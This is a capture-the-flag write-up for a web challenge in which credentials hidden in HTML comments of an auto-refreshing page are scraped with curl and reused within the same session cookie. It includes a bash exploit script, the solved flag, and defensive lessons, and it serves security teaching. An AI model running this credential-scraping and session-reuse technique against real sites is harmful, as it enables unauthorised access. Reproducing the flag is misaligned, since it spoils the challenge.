# Challenge 6: Vanishing Point

**Category:** Web  
**Difficulty:** Medium  
**Status:** ✅ Solved

**Flag:** `HQX{c51e54704c0cad1e5c2029a576588f58}`

## Description

Bypass an auto-refreshing webpage to extract and reuse session-specific credentials before they expire.

## Challenge Overview

The webpage automatically reloads every 5 seconds, resetting the session and generating new credentials each time. The challenge is to capture credentials from the initial response and use them to authenticate before the session expires.

## Files

- `site.html` - Challenge source code
- `c.txt` - Saved cookies from exploitation
- `solution.md` - Detailed writeup

## Vulnerability Analysis

### Auto-Refresh Mechanism

```javascript
setInterval(() => {
    location.reload();
}, 5000);
```

This JavaScript code forces a page reload every 5 seconds, creating a new session and new credentials.

### Credential Storage

Credentials are hidden in HTML comments and change per session:

```html
<!-- Username="hquser-<random>" -->
<!-- Password="<random>" -->
```

Key properties:
- Generated **per session**
- Valid **only for current session**
- Not visible in rendered page (only in raw HTML)
- New session cookie issued on each reload

### Core Issue

The security relies entirely on **client-side JavaScript** to enforce timing. Tools like `curl` (which don't execute JavaScript) can bypass this.

## Exploitation

### Key Insight

**JavaScript-independent clients preserve the initial session**, allowing:
1. Capture of first response (including credentials)
2. Reuse of same session cookie
3. Authentication with one-time credentials

### Attack Steps

#### Step 1: Fetch and Save Session Cookie

```bash
curl -s -c cookies.txt http://challenge.tcshackquest.com:12960/
```

This saves the initial response and preserves the session cookie.

#### Step 2: Extract Credentials

```bash
curl -s -c cookies.txt http://challenge.tcshackquest.com:12960/ \
  | grep -oP 'Username="\K[^"]+|Password="\K[^"]+'
```

This extracts:
- Username: `hquser-<random_string>`
- Password: `<random_string>`

#### Step 3: Authenticate

```bash
curl -b cookies.txt -X POST http://challenge.tcshackquest.com:12960/ \
  -d "username=hquser-<extracted>&password=<extracted>"
```

Using the **same session cookie** (`-b cookies.txt`), submit credentials via POST.

#### Step 4: Retrieve Flag

Server responds with:
```
HQX{c51e54704c0cad1e5c2029a576588f58}
```

## Complete Exploit

```bash
#!/bin/bash
# Save this as exploit.sh

TARGET="http://challenge.tcshackquest.com:12960"
COOKIES="cookies.txt"

# Fetch and save cookies
curl -s -c "$COOKIES" "$TARGET/" > initial.html

# Extract credentials
CREDS=$(curl -s -c "$COOKIES" "$TARGET/" | grep -oP 'Username="\K[^"]+|Password="\K[^"]+')
USERNAME=$(echo "$CREDS" | head -1)
PASSWORD=$(echo "$CREDS" | tail -1)

echo "[+] Username: $USERNAME"
echo "[+] Password: $PASSWORD"

# Authenticate
echo "[+] Authenticating..."
curl -b "$COOKIES" -X POST "$TARGET/" \
  -d "username=$USERNAME&password=$PASSWORD"
```

## Root Causes

| Vulnerability | Explanation |
|---|---|
| **Sensitive Information Disclosure** | Credentials exposed in HTML comments |
| **Client-Side Security Dependency** | JavaScript enforcement can be bypassed |
| **Improper Session Management** | One-time credentials lack server-side validation |
| **TOCTOU (Time-of-Check Time-of-Use)** | Race condition between credential generation and use |
| **Lack of Rate Limiting** | No protection against rapid authentication attempts |

## Why It Works

1. **No JavaScript execution** - `curl` ignores browser scripts
2. **HTTP protocol only** - Cookies preserved across requests
3. **HTML comments visible** - Raw HTTP response includes comments
4. **No server-side refresh check** - Server doesn't validate timing
5. **Credentials valid** - One-time credentials work if used in same session

## Defensive Measures

1. **Server-side enforcement** - Generate and verify credentials server-side
2. **Rate limiting** - Limit login attempts per IP/session
3. **Short credential lifetime** - Credentials expire quickly
4. **Session verification** - Validate that credentials are used in correct session
5. **Remove comments** - Never include sensitive data in HTML comments
6. **CSRF protection** - Add tokens to prevent cross-site attacks
7. **HTTPS only** - Encrypt all communications

## Tools Used

- **curl** - HTTP client without JavaScript execution
- **grep** - Pattern matching for credential extraction
- **bash** - Scripting for automation

## Key Lessons

1. **Never trust client-side security** - Always validate server-side
2. **Comments are not hidden** - They appear in raw HTTP responses
3. **Sessions are fungible** - Reusing cookies is trivial
4. **Timing is not security** - Time-based checks are easily bypassed
5. **Test bypass techniques** - Every security mechanism should be evaluated

## Related Vulnerabilities

- **Insecure Direct Object Reference (IDOR)**
- **Broken Authentication**
- **Sensitive Data Exposure**
- **Broken Access Control**
- **Using Components with Known Vulnerabilities**

## Flag Format

```
HQX{c51e54704c0cad1e5c2029a576588f58}
```

---

**Challenge solved successfully using client-side bypass techniques.**
